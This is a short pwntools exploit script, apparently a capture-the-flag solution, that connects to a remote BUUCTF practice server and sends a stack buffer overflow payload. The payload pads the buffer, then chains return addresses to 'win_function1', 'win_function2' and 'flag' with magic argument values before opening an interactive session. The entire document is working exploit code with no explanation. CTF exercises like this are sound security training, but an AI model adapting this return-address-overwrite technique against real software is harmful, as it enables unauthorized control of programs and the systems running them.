from pwn import *

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29541)
elf = ELF('./pwn')

payload = cyclic(0x18 + 4)
payload += p32(elf.symbols['win_function1'])
payload += p32(elf.symbols['win_function2']) + p32(elf.symbols['flag'])
payload += p32(0xBAAAAAAD) + p32(0xDEADBAAD)

io.sendlineafter(b'Enter your input> ', payload)

io.interactive()